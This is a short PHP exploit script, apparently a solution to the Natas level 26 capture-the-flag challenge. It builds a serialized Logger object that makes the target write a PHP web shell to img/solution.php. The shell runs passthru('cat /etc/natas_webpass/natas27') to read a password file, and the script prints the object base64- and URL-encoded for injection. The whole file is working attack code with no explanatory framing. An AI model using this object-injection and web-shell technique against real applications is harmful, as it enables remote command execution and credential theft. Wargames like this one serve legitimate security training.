<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            // initialise variables
            $this->initMsg="<?php passthru('cat /etc/natas_webpass/natas27') ?>";
            $this->exitMsg="<?php passthru('cat /etc/natas_webpass/natas27') ?>";
            $this->logFile = "img/solution.php";
        }

        function log($msg){
            echo "\n";
        }

        function __destruct(){
            echo "\n";
        }
    }

$obj = new Logger("Flags");
echo urlencode(base64_encode(serialize($obj)));
?>
